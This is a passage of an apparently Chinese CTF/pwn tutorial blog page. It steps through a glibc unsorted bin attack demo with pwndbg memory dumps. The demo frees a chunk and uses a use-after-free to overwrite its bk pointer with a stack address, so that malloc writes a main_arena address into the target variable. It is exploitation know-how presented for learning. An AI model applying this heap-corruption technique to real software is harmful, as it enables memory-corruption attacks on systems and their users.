class="number">0x00007fffffffddd8</span></span><br><span class="line"><span class="number">0x7fffffffdd10</span>: <span class="number">0x0000000100000000</span>      <span class="number">0x00000000004006a6</span></span><br><span class="line"><span class="number">0x7fffffffdd20</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x4d609e7044d2a5b4</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>gx &amp;stack_var</span><br><span class="line"><span class="number">0x7fffffffdcd8</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x00007fffffffddd0</span></span><br><span class="line"><span class="number">0x7fffffffdce8</span>: <span class="number">0xc9bcfe6894c28c00</span>      <span class="number">0x0000000000400870</span></span><br><span class="line"><span class="number">0x7fffffffdcf8</span>: <span class="number">0x00007ffff7820830</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd08</span>: <span class="number">0x00007fffffffddd8</span>      <span class="number">0x0000000100000000</span></span><br><span class="line"><span class="number">0x7fffffffdd18</span>: <span class="number">0x00000000004006a6</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到：</p>
+<p>此时stack_var 值为 0，地址为0x7fffffffdce0；p 的值为0x7fffffffddd0，地址为0x7fffffffdcd8。</p>
+<h5 id="unsigned-long-p-malloc-0x410"><a href="#unsigned-long-p-malloc-0x410" class="headerlink" title="unsigned long *p&#x3D;malloc(0x410);"></a>unsigned long *p&#x3D;malloc(0x410);</h5><p>继续让程序执行 unsigned long *p&#x3D;malloc(0x410);，继续查看内存：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────────────────────────────────────────────────────[ DISASM / x86<span class="number">-64</span> / <span class="built_in">set</span> emulate on ]───────────────────────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">0x400722</span> &lt;main+<span class="number">124</span>&gt;    mov    edi, <span class="number">0x410</span>     EDI =&gt; <span class="number">0x410</span></span><br><span class="line">   <span class="number">0x400727</span> &lt;main+<span class="number">129</span>&gt;    call   <span class="built_in">malloc</span>@plt                  &lt;<span class="built_in">malloc</span>@plt&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x40072c</span> &lt;main+<span class="number">134</span>&gt;    mov    qword ptr [rbp - <span class="number">0x10</span>], rax</span><br><span class="line"> ► <span class="number">0x400730</span> &lt;main+<span class="number">138</span>&gt;    mov    rax, qword ptr [rip + <span class="number">0x200929</span>]     RAX, [<span class="built_in">stderr</span>@@GLIBC_2.<span class="number">2.5</span>] =&gt; <span class="number">0x7ffff7bc4540</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2887</span></span><br><span class="line">   <span class="number">0x400737</span> &lt;main+<span class="number">145</span>&gt;    mov    rdx, qword ptr [rbp - <span class="number">0x10</span>]         RDX, [&#123;p&#125;] =&gt; <span class="number">0x602010</span> ◂— <span class="number">0</span></span><br><span class="line">   <span class="number">0x40073b</span> &lt;main+<span class="number">149</span>&gt;    mov    esi, <span class="number">0x400a18</span>                       ESI =&gt; <span class="number">0x400a18</span> ◂— in al, <span class="number">0xb8</span></span><br><span class="line">   <span class="number">0x400740</span> &lt;main+<span class="number">154</span>&gt;    mov    rdi, rax                            RDI =&gt; <span class="number">0x7ffff7bc4540</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2887</span></span><br><span class="line">   <span class="number">0x400743</span> &lt;main+<span class="number">157</span>&gt;    mov    eax, <span class="number">0</span>                              EAX =&gt; <span class="number">0</span></span><br><span class="line">   <span class="number">0x400748</span> &lt;main+<span class="number">162</span>&gt;    call   <span class="built_in">fprintf</span>@plt                 &lt;<span class="built_in">fprintf</span>@plt&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x40074d</span> &lt;main+<span class="number">167</span>&gt;    mov    rax, qword ptr [rip + <span class="number">0x20090c</span>]     RAX, [<span class="built_in">stderr</span>@@GLIBC_2.<span class="number">2.5</span>]</span><br><span class="line">   <span class="number">0x400754</span> &lt;main+<span class="number">174</span>&gt;    mov    rcx, rax</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">pwndbg will try to resolve the heap symbols via heuristic now since we cannot resolve the heap via the debug symbols.</span><br><span class="line">This might not work in all cases. Use `help <span class="built_in">set</span> resolve-heap-via-heuristic` <span class="keyword">for</span> more details.                                                                                            </span><br><span class="line">                                                                                                                                                                                         </span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x602000</span></span><br><span class="line">Size: <span class="number">0x420</span> (with flag bits: <span class="number">0x421</span>)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x602420</span></span><br><span class="line">Size: <span class="number">0x20be0</span> (with flag bits: <span class="number">0x20be1</span>)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; info local</span><br><span class="line">stack_var = <span class="number">0</span></span><br><span class="line">p = <span class="number">0x602010</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x602000</span></span><br><span class="line"><span class="number">0x602000</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000421</span>==&gt;chunk1</span><br><span class="line"><span class="number">0x602010</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="malloc-500"><a href="#malloc-500" class="headerlink" title="malloc(500);"></a>malloc(500);</h5><p>继续执行 malloc(500);此时创建了两个堆块，这里是为了避免 chunk1 和 top_chunk 相邻而导致在 freechunk1 时无法会受到 unsortedbin 当中。<strong><font style="color:#DF2A3F;">当我们释放一个不属于 fastbin 的 chunk ，并且该 chunk 不和 top_chunk 相邻，该 chunk 会被首先放到 unsortedbin 当中，相邻则被放在 top_chunk</font></strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x602000</span>==&gt;chunk1</span><br><span class="line">Size: <span class="number">0x420</span> (with flag bits: <span class="number">0x421</span>)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x602420</span>==&gt;chunk2</span><br><span class="line">Size: <span class="number">0x200</span> (with flag bits: <span class="number">0x201</span>)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x602620</span></span><br><span class="line">Size: <span class="number">0x209e0</span> (with flag bits: <span class="number">0x209e1</span>)</span><br></pre></td></tr></table></figure>
+
+<h5 id="继续-n-执行-free-p"><a href="#继续-n-执行-free-p" class="headerlink" title="继续 n 执行 free(p);"></a>继续 n 执行 free(p);</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────────────────────────────────────────────[ DISASM / x86<span class="number">-64</span> / <span class="built_in">set</span> emulate on ]───────────────────────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">0x40076b</span> &lt;main+<span class="number">197</span>&gt;    mov    edi, <span class="number">0x1f4</span>        EDI =&gt; <span class="number">0x1f4</span></span><br><span class="line">   <span class="number">0x400770</span> &lt;main+<span class="number">202</span>&gt;    call   <span class="built_in">malloc</span>@plt                  &lt;<span class="built_in">malloc</span>@plt&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x400775</span> &lt;main+<span class="number">207</span>&gt;    mov    rax, qword ptr [rbp - <span class="number">0x10</span>]     RAX, [&#123;p&#125;] =&gt; <span class="number">0x602010</span> ◂— <span class="number">0</span></span><br><span class="line">   <span class="number">0x400779</span> &lt;main+<span class="number">211</span>&gt;    mov    rdi, rax                        RDI =&gt; <span class="number">0x602010</span> ◂— <span class="number">0</span></span><br><span class="line">   <span class="number">0x40077c</span> &lt;main+<span class="number">214</span>&gt;    call   <span class="built_in">free</span>@plt                    &lt;<span class="built_in">free</span>@plt&gt;</span><br><span class="line"> </span><br><span class="line"> ► <span class="number">0x400781</span> &lt;main+<span class="number">219</span>&gt;    mov    rax, qword ptr [rbp - <span class="number">0x10</span>]         RAX, [&#123;p&#125;] =&gt; <span class="number">0x602010</span> —▸ <span class="number">0x7ffff7bc3b78</span> ◂— <span class="number">0x602620</span> <span class="comment">/* &#x27; &amp;`&#x27; */</span></span><br><span class="line">   <span class="number">0x400785</span> &lt;main+<span class="number">223</span>&gt;    add    rax, <span class="number">8</span>                              RAX =&gt; <span class="number">0x602018</span> (<span class="number">0x602010</span> + <span class="number">0x8</span>)</span><br><span class="line">   <span class="number">0x400789</span> &lt;main+<span class="number">227</span>&gt;    mov    rax, qword ptr [rax]                RAX, [<span class="number">0x602018</span>] =&gt; <span class="number">0x7ffff7bc3b78</span> —▸ <span class="number">0x602620</span> ◂— <span class="number">0</span></span><br><span class="line">   <span class="number">0x40078c</span> &lt;main+<span class="number">230</span>&gt;    mov    rdx, rax                            RDX =&gt; <span class="number">0x7ffff7bc3b78</span> —▸ <span class="number">0x602620</span> ◂— <span class="number">0</span></span><br><span class="line">   <span class="number">0x40078f</span> &lt;main+<span class="number">233</span>&gt;    mov    rax, qword ptr [rip + <span class="number">0x2008ca</span>]     RAX, [<span class="built_in">stderr</span>@@GLIBC_2.<span class="number">2.5</span>] =&gt; <span class="number">0x7ffff7bc4540</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2887</span></span><br><span class="line">   <span class="number">0x400796</span> &lt;main+<span class="number">240</span>&gt;    mov    esi, <span class="number">0x400a80</span>                       ESI =&gt; <span class="number">0x400a80</span> ◂— in eax, <span class="number">0xbd</span></span><br><span class="line">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x602000</span> —▸ <span class="number">0x7ffff7bc3b78</span> ◂— <span class="number">0x602000</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x602000</span></span><br><span class="line"><span class="number">0x602000</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000421</span>==&gt;unsortedbin</span><br><span class="line"><span class="number">0x602010</span>:       <span class="number">0x00007ffff7bc3b78</span>      <span class="number">0x00007ffff7bc3b78</span></span><br><span class="line">                --fd                    --bk</span><br><span class="line"><span class="number">0x602020</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602050</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+
+<p>我们之前了解到，当 unsortedbin 之后一个 free_chunk 时，他的fd和bk指针都指向 unsortedbin 本身。</p>
+<p><img src="/HFTTC.github.io/./img/73098186_2PJk1qfRxSDyKr6a/1605518448778-38373f22-a306-4fe8-8c15-7a084e086147-454005.png" alt="1605518448778-38373f22-a306-4fe8-8c15-7a084e086147.png"></p>
+<h5 id="执行p-1-unsigned-long-stack-var-2"><a href="#执行p-1-unsigned-long-stack-var-2" class="headerlink" title="执行p[1]&#x3D;(unsigned long)(&amp;stack_var-2);"></a>执行p[1]&#x3D;(unsigned long)(&amp;stack_var-2);</h5><p><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">p[1]</font>等价于<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">*(p+1)</font>，即<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">p</font>指向的地址偏移 1 个元素长度的位置（比如<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">p</font>是 8 字节指针，<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">p[1]</font>就是<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">p+8</font>的地址）</p>
+<p><code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">p[1]</font></code><font style="color:rgb(0, 0, 0);">等价于</font><code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"><em>(p+8)</font></code><font style="color:rgb(0, 0, 0);">&#x3D; </font><code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"></em>(0x602010+8)</font></code><font style="color:rgb(0, 0, 0);">&#x3D; </font><code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">0x602018</font></code><font style="color:rgb(0, 0, 0);">这正是 chunk 的</font><code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">bk</font></code><font style="color:rgb(0, 0, 0);">字段的地址！</font></p>
+<p><code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">stack_var</font></code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">的地址是</font><code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">0x7fffffffdcd8</font></code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">（</font><code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">rbp-0x18</font></code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">）；</font></p>
+<p><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">&amp;stack_var - 2 &#x3D; 0x7fffffffdcd8 - 0x10 &#x3D; 0x7fffffffdcc8</font></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────────────────────────────────────────────[ DISASM / x86<span class="number">-64</span> / <span class="built_in">set</span> emulate on ]───────────────────────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">0x4007a8</span> &lt;main+<span class="number">258</span>&gt;    mov    rax, qword ptr [rbp - <span class="number">0x10</span>]         RAX, [&#123;p&#125;] =&gt; <span class="number">0x602010</span> —▸ <span class="number">0x7ffff7bc3b78</span> ◂— <span class="number">0x602620</span> <span class="comment">/* &#x27; &amp;`&#x27; */</span></span><br><span class="line">   <span class="number">0x4007ac</span> &lt;main+<span class="number">262</span>&gt;    lea    rdx, [rax + <span class="number">8</span>]                      RDX =&gt; <span class="number">0x602018</span> —▸ <span class="number">0x7ffff7bc3b78</span> —▸ <span class="number">0x602620</span> ◂— ...</span><br><span class="line">   <span class="number">0x4007b0</span> &lt;main+<span class="number">266</span>&gt;    lea    rax, [rbp - <span class="number">0x18</span>]                   RAX =&gt; <span class="number">0x7fffffffdcd8</span> ◂— <span class="number">0</span></span><br><span class="line">   <span class="number">0x4007b4</span> &lt;main+<span class="number">270</span>&gt;    sub    rax, <span class="number">0x10</span>                           RAX =&gt; <span class="number">0x7fffffffdcc8</span> (<span class="number">0x7fffffffdcd8</span> - <span class="number">0x10</span>)</span><br><span class="line">   <span class="number">0x4007b8</span> &lt;main+<span class="number">274</span>&gt;    mov    qword ptr [rdx], rax                [<span class="number">0x602018</span>] &lt;= <span class="number">0x7fffffffdcc8</span> —▸ <span class="number">0x4007a8</span> (main+<span class="number">258</span>) ◂— mov rax, qword ptr [rbp - <span class="number">0x10</span>]</span><br><span class="line"> ► <span class="number">0x4007bb</span> &lt;main+<span class="number">277</span>&gt;    mov    rax, qword ptr [rip + <span class="number">0x20089e</span>]     RAX, [<span class="built_in">stderr</span>@@GLIBC_2.<span class="number">2.5</span>] =&gt; <span class="number">0x7ffff7bc4540</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2887</span></span><br><span class="line">   <span class="number">0x4007c2</span> &lt;main+<span class="number">284</span>&gt;    mov    rcx, rax                            RCX =&gt; <span class="number">0x7ffff7bc4540</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2887</span></span><br><span class="line">   <span class="number">0x4007c5</span> &lt;main+<span class="number">287</span>&gt;    mov    edx, <span class="number">0x51</span>                           EDX =&gt; <span class="number">0x51</span></span><br><span class="line">   <span class="number">0x4007ca</span> &lt;main+<span class="number">292</span>&gt;    mov    esi, <span class="number">1</span>                              ESI =&gt; <span class="number">1</span></span><br><span class="line">   <span class="number">0x4007cf</span> &lt;main+<span class="number">297</span>&gt;    mov    edi, <span class="number">0x400af0</span>                       EDI =&gt; <span class="number">0x400af0</span> ◂— out <span class="number">0x8e</span>, eax</span><br><span class="line">   <span class="number">0x4007d4</span> &lt;main+<span class="number">302</span>&gt;    call   fwrite@plt                  &lt;fwrite@plt&gt;</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x602000</span></span><br><span class="line"><span class="number">0x602000</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000421</span>==&gt;unsortedbin</span><br><span class="line"><span class="number">0x602010</span>:       <span class="number">0x00007ffff7bc3b78</span>      <span class="number">0x00007fffffffdcc8</span></span><br><span class="line">                --fd                    --bk此时发现bk被更改了</span><br><span class="line"><span class="number">0x602020</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">pwndbg&gt; unsortedbin</span><br><span class="line">unsortedbin</span><br><span class="line">all [corrupted]</span><br><span class="line">FD: <span class="number">0x602000</span> —▸ <span class="number">0x7ffff7bc3b78</span> ◂— <span class="number">0x602000</span></span><br><span class="line">BK: <span class="number">0x602000</span> —▸ <span class="number">0x7fffffffdcc8</span> —▸ <span class="number">0x602010</span> ◂— <span class="number">0</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x00007fffffffdcc8</span></span><br><span class="line"><span class="number">0x7fffffffdcc8</span>: <span class="number">0x00000000004007a8</span>      <span class="number">0x0000000000400870</span></span><br><span class="line">--&gt;unsortedbin——bk指针所指的地方</span><br><span class="line"></span><br><span class="line"><span class="number">0x7fffffffdcd8</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000602010</span></span><br><span class="line">--&gt;想要被修改为超大值的地方</span><br><span class="line"></span><br><span class="line"><span class="number">0x7fffffffdce8</span>: <span class="number">0xc9bcfe6894c28c00</span>      <span class="number">0x0000000000400870</span></span><br><span class="line"><span class="number">0x7fffffffdcf8</span>: <span class="number">0x00007ffff7820830</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd08</span>: <span class="number">0x00007fffffffddd8</span>      <span class="number">0x0000000100000000</span></span><br><span class="line"><span class="number">0x7fffffffdd18</span>: <span class="number">0x00000000004006a6</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd28</span>: <span class="number">0x4d609e7044d2a5b4</span>      <span class="number">0x00000000004005b0</span></span><br><span class="line"><span class="number">0x7fffffffdd38</span>: <span class="number">0x00007fffffffddd0</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd48</span>: <span class="number">0x0000000000000000</span>      <span class="number">0xb29f610fee32a5b4</span></span><br><span class="line"><span class="number">0x7fffffffdd58</span>: <span class="number">0xb29f71f45be2a5b4</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+
+<p><strong><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">攻击本质</font></strong>：把 chunk 的<code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">bk</font></code>指针从<code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">main_arena</font></code>地址改成<code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">&amp;stack_var-2</font></code>（栈地址），这一步依赖 “UAF（释放后使用）” 漏洞 ——free (p) 后仍能修改 p 指向的内存。</p>
+<p><img src="/HFTTC.github.io/./img/73098186_2PJk1qfRxSDyKr6a/1605518532583-ef6d2bd7-01e3-4c82-9cdd-21d6d20a1e1a-168825.png" alt="1605518532583-ef6d2bd7-01e3-4c82-9cdd-21d6d20a1e1a.png"></p>
+<ul>
+<li><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">原 chunk</font><code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">bk</font></code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">：</font><code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">0x7ffff7bc3b78</font></code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">（main_arena 地址，unsorted bin 的尾节点）；</font></li>
+<li><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">新 chunk</font><code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">bk</font></code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">：</font><code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">0x7fffffffdcc8</font></code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">（栈上</font><code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">stack_var</font></code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">偏移 2 个 long 的地址）；</font></li>
+<li><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">最终 unsorted bin 的</font><code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">BK</font></code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">链指向了栈地址</font><code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">0x7fffffffdcc8</font></code><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">，而非 libc 的 main_arena。</font></li>
+</ul>
+<h5 id="执行malloc-0x410"><a href="#执行malloc-0x410" class="headerlink" title="执行malloc(0x410);"></a>执行malloc(0x410);</h5><p>在执行 malloc(0x410)时，会判断所申请的 chunk 处于 smallbin 所在的范围，但此时 smallbin 中并没有空闲的 chunk，所以会从 unsortedbin 中寻找，发现 unsortedbin 不为空，于是把 unsortedbin 中的最后一个 chunk 拿出来。（先进先出原则 FIFO）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; unsortedbin</span><br><span class="line">unsortedbin</span><br><span class="line">all [corrupted]</span><br><span class="line">FD: <span class="number">0x602000</span> —▸ <span class="number">0x7ffff7bc3b78</span> ◂— <span class="number">0x602000</span></span><br><span class="line">BK: <span class="number">0x7fffffffdcc8</span> —▸ <span class="number">0x602010</span> ◂— <span class="number">0</span></span><br><span class="line">------------------------------------------------------------------------------------------------------------------</span><br><span class="line">pwndbg&gt; info local</span><br><span class="line">stack_var = <span class="number">140737349696376</span></span><br><span class="line">p = <span class="number">0x602010</span></span><br></pre></td></tr></table></figure>
+
+<p><strong><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">核心原理</font></strong>：当调用<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">malloc(0x410)</font>时，glibc 会从 unsorted bin 中查找匹配大小的 chunk，执行链表维护逻辑：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// glibc底层逻辑（简化）</span><br><span class="line">bck = unsorted_chunks(av)-&gt;bk;  // bck就是我们篡改后的&amp;stack_var-2</span><br><span class="line">bck-&gt;fd = unsorted_chunks(av);  // 把unsorted bin的地址写入bck-&gt;fd（即&amp;stack_var-2 + 8 = &amp;stack_var）</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">bck-&gt;fd &#x3D; (&amp;stack_var-2) + 8 &#x3D; &amp;stack_var（因为 fd 字段在 chunk 中偏移 8 字节）；</font></li>
+<li><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">&amp;stack_var-2：64 位下unsigned long占 8 字节，-2等价于地址减0x10（即0x7fffffffdcc8）  </font></li>
+<li><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">最终：unsorted_chunks(av)（unsorted bin 的地址）被写入stack_var的地址，stack_var的值从 0 变成这个高地址（“超大数”）。</font></li>
+</ul>
+<p><img src="/HFTTC.github.io/./img/73098186_2PJk1qfRxSDyKr6a/1605532168101-57e7d7b0-b051-4c2d-89b2-2fb8cdd2c2a5-009434.png" alt="1605532168101-57e7d7b0-b051-4c2d-89b2-2fb8cdd2c2a5.png"><img src="/HFTTC.github.io/./img/73098186_2PJk1qfRxSDyKr6a/1605532214849-ed5b7433-5172-407f-b9a0-ee4bb07306fa-966537.png" alt="1605532214849-ed5b7433-5172-407f-b9a0-ee4bb07306fa.png"><img src="/HFTTC.github.io/./img/73098186_2PJk1qfRxSDyKr6a/1770396565331-c320a05e-4295-4a28-ae87-d99ba95e7037-476894.png" alt="1770396565331-c320a05e-4295-4a28-ae87-d99ba95e7037.png"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>首先我们将一个堆块释放到 unsortedbin 当中，然后利用堆溢出修改 unsortedbin 中的 chunk 的 bk 指针，这个 bk 指针指向 target_addr-0x10。当我们用 malloc 申请 unsortedbin 中的堆块时，target_addr 中的值就会变成 main_arena+88 地址的值# target_addr：目标地址（想要修改为超大数的地址）。</p>
+<blockquote>
+<p>更新: 2026-03-09 13:21:34<br>原文: <a target="_blank" rel="noopener" href="https://www.yuque.com/idcm/wnemg9/qq62i2u19syawd01">https://www.yuque.com/idcm/wnemg9/qq62i2u19syawd01</a></p>
+</blockquote>
+
+    </div>
+    <footer class="article-footer">
+      
+      
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="UnSortedbinAttack例题分析" class="lazyload">
+        <a href="/HFTTC.github.io/2026/04/28/PWN/PWNCTF/UnsortedbinAttack%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D/UnSortedbinAttack%E4%BE%8B%E9%A2%98%E5%88%86%E6%9E%90/" aria-label="前一篇: UnSortedbinAttack例题分析" title="前一篇: UnSortedbinAttack例题分析"></a>
+        <div class="article-nav-caption">前一篇</div>
